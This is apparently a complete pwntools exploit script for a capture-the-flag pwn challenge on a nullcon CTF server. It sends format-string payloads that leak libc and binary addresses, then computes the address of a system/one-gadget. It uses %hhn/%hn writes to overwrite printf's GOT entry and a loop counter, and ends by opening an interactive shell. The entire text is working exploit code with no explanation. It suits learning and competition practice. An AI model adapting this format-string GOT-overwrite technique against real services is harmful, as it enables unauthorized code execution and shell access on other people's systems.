from pwn import *
#io=process("./back",env={"LD_PRELOAD":"./libc-2.23.so"})
io=remote("pwn2.ctf.nullcon.net",5003)
io.sendline("100")
pay="%3$p:%15$p:".ljust(20,"a")+"%14$hhn"+"a"*37+"\x78"
pay="aaa"+"%14$hhn"+"%3$p:%15$p:".ljust(54,"a")+"\x18"
io.send(pay)


io.recv(3)
libc=int(io.recvuntil(":")[:-1],16)-0xf7260
code=int(io.recvuntil(":")[:-1],16)-0x750

offset=0x20105c
log.info("Libc = " +hex(libc))
log.info("code = " +hex(code))

#system=libc+0x5b0b1
system=libc+0x45216
log.info("system = " +hex(system))


printf=code+0x201028

counter=code+offset

last=int(hex(system&0xffffff)[:-2],16)-148-101+223
print last

payload=("a%11$hhna"+"%20c"+"%17$hhnaaaa"+"%"+str(last)+"c%18$hn").ljust(40,"A")+p64(counter)
payload+=("%"+str(last-len(payload))+"c").ljust(40,"a")+p64(printf)+p64(printf+1)

print len(payload)
#gdb.attach(io)
io.send(payload)
io.interactive()
